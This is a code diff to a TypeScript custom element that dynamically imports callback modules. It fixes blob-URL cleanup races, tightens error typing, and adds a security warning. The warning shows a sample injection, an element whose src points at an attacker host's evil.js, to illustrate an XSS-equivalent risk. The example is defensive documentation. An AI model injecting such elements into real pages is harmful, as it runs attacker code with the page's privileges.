@@ -1,4 +1,4 @@
-import { config } from "../config.js";
+import { _getInternalConfig } from "../config.js";
 
 /**
  * <hawc-s3-callback on="completed"><script type="module">…</script></hawc-s3-callback>
@@ -9,12 +9,23 @@ import { config } from "../config.js";
  *
  * Server-side post-processing does NOT use this element — for that, register
  * a hook on the server-side S3Core via `core.registerPostProcess(fn)`.
+ *
+ * SECURITY WARNING — this element dynamic-imports arbitrary ES modules from:
+ *   (a) an inline `<script type="module">` child, or
+ *   (b) the `src` attribute (a URL).
+ * Both are an XSS-equivalent vector when rendered inside untrusted HTML: a
+ * page that includes HTML from a user-authored source can inject
+ * `<hawc-s3-callback src="https://attacker/evil.js">` and the attacker's
+ * module will execute with the same privileges as the page. Do NOT mount
+ * this element in any context that renders untrusted HTML. For trusted
+ * contexts, consider pairing it with a strict CSP (`script-src` /
+ * `trusted-types`) to restrict which module URLs are loadable.
  */
 export class S3Callback extends HTMLElement {
   private _hostElement: HTMLElement | null = null;
   private _eventName: string = "";
   private _handler: ((e: Event) => void) | null = null;
-  private _fn: ((detail: any, ctx: { event: Event; host: HTMLElement }) => any) | null = null;
+  private _fn: ((detail: unknown, ctx: { event: Event; host: HTMLElement }) => unknown | Promise<unknown>) | null = null;
   private _blobUrl: string | null = null;
   /** Increments per (re)load; lets stale dynamic-import resolutions abort. */
   private _loadGeneration: number = 0;
@@ -47,7 +58,7 @@ export class S3Callback extends HTMLElement {
     // Walk up the DOM looking for an instance of the configured host tag.
     // Reading config here (rather than at module load) means a `setConfig`
     // call before bootstrapS3() takes effect even on already-defined classes.
-    const hostTag = config.tagNames.s3.toLowerCase();
+    const hostTag = _getInternalConfig().tagNames.s3.toLowerCase();
     let node: Node | null = this.parentNode;
     while (node) {
       if (node instanceof HTMLElement && node.tagName.toLowerCase() === hostTag) {
@@ -75,6 +86,14 @@ export class S3Callback extends HTMLElement {
 
     const src = this.getAttribute("src");
     let moduleUrl: string;
+    // Capture THIS invocation's blob URL locally so a subsequent
+    // _loadModule(gen+1) that overwrites `this._blobUrl` with a newer blob
+    // does not cause our stale cleanup below to revoke the wrong URL.
+    // Previously `this._revokeBlob()` on a stale path read
+    // `this._blobUrl` — which by then pointed at the newer generation's
+    // blob — and revoked it, causing the newer generation's dynamic
+    // import to 404 on a revoked URL.
+    let myBlobUrl: string | null = null;
     if (src) {
       moduleUrl = src;
     } else {
@@ -82,34 +101,80 @@ export class S3Callback extends HTMLElement {
       const code = script?.textContent ?? "";
       if (!code.trim()) return;
       const blob = new Blob([code], { type: "text/javascript" });
-      this._blobUrl = URL.createObjectURL(blob);
-      moduleUrl = this._blobUrl;
+      myBlobUrl = URL.createObjectURL(blob);
+      this._blobUrl = myBlobUrl;
+      moduleUrl = myBlobUrl;
     }
 
     try {
+      // TODO(future): optional `integrity` attribute (SRI). Native dynamic
+      // `import()` does not yet honour the `integrity` option that
+      // `<script type="module" integrity="...">` does, so enforcement would
+      // have to be done manually: fetch the module as text, verify a
+      // SubtleCrypto hash matches, then feed into a Blob URL. Until the
+      // platform surfaces an import-time integrity hook, rely on the
+      // README security warning + CSP `script-src` / `trusted-types` to
+      // restrict which module URLs can be loaded. Recorded as a future
+      // enhancement; not gating current behaviour.
       const mod = await import(/* @vite-ignore */ moduleUrl);
       // After the await, two things can have changed: (a) a newer load
       // superseded this one (_loadGeneration bumped), (b) the element was
       // removed from the DOM. In either case we must revoke the Blob URL
-      // we just allocated — disconnectedCallback's _revokeBlob() ran
-      // before our assignment and will not run again.
+      // WE just allocated — not whatever `this._blobUrl` now points at
+      // (it may belong to a newer generation that is still live).
       if (generation !== this._loadGeneration || !this.isConnected) {
-        this._revokeBlob();
+        this._revokeMyBlob(myBlobUrl);
         return;
       }
       const fn = mod?.default;
       if (typeof fn !== "function") {
+        // Revoke OUR Blob URL: the module resolved but has no usable export,
+        // so the allocation serves no further purpose. Same "every alloc is
+        // matched by a revoke within a bounded window" invariant as the catch
+        // path below — we do not wait for a hypothetical disconnect.
+        this._revokeMyBlob(myBlobUrl);
         this._dispatchLocalError(new Error("[@wc-bindable/hawc-s3] <hawc-s3-callback> module has no default export function."));
         return;
       }
-      this._fn = fn;
-    } catch (e: any) {
+      // Cast to our declared signature. Runtime shape is validated above
+      // (typeof === "function"); the user-authored module's parameter types
+      // are opaque to us, so we treat detail as `unknown` per the ABI contract.
+      this._fn = fn as (detail: unknown, ctx: { event: Event; host: HTMLElement }) => unknown | Promise<unknown>;
+    } catch (e: unknown) {
+      // Always revoke OUR Blob URL on the failure path — scoped to the local
+      // capture so the revoke can never target a newer generation's blob
+      // (which may now live in `this._blobUrl` if a racing _loadModule has
+      // already started and assigned its own URL). `_revokeMyBlob` additionally
+      // clears `this._blobUrl` when it still points at the one we revoked,
+      // so a same-generation disconnectedCallback does not attempt a
+      // double-revoke.
+      //
+      // A prior revision left `_blobUrl` attached on still-connected failure
+      // and relied on `disconnectedCallback` (or the next `_loadModule`) to
+      // revoke it. In a page that pins a <hawc-s3-callback> for a long
+      // session and retries `src` after transient network failures, those
+      // stale URLs would accumulate indefinitely — the disconnect path is
+      // hypothetical, not guaranteed. Revoking unconditionally upholds the
+      // invariant "every createObjectURL is matched by a revokeObjectURL"
+      // within a bounded window regardless of how the element is used.
+      this._revokeMyBlob(myBlobUrl);
       if (generation !== this._loadGeneration || !this.isConnected) {
-        this._revokeBlob();
         return;
       }
-      this._dispatchLocalError(e);
+      this._dispatchLocalError(e instanceof Error ? e : new Error(String(e)));
     }
+  }
+
+  /**
+   * Revoke a specific Blob URL that this invocation allocated, without
+   * touching `this._blobUrl` (which may now belong to a newer generation).
+   * If our URL IS still the element's current blob, clear the field too so
+   * disconnectedCallback does not try to revoke an already-revoked URL.
+   */
+  private _revokeMyBlob(myBlobUrl: string | null): void {
+    if (!myBlobUrl) return;
+    URL.revokeObjectURL(myBlobUrl);
+    if (this._blobUrl === myBlobUrl) this._blobUrl = null;
   }
 
   private _revokeBlob(): void {
@@ -147,12 +212,16 @@ export class S3Callback extends HTMLElement {
       const detail = (e as CustomEvent).detail;
       try {
         const ret = fn(detail, { event: e, host });
-        // Surface async failures so they do not vanish silently.
+        // Surface async failures so they do not vanish silently. Non-Error
+        // rejections are re-wrapped so consumers always receive a stable
+        // Error shape at `hawc-s3-callback:error`.
         if (ret && typeof (ret as Promise<unknown>).then === "function") {
-          (ret as Promise<unknown>).catch((err: any) => this._dispatchLocalError(err));
+          (ret as Promise<unknown>).catch((err: unknown) =>
+            this._dispatchLocalError(err instanceof Error ? err : new Error(String(err))),
+          );
         }
-      } catch (err: any) {
-        this._dispatchLocalError(err);
+      } catch (err: unknown) {
+        this._dispatchLocalError(err instanceof Error ? err : new Error(String(err)));
       }
     };
     this._handler = handler;
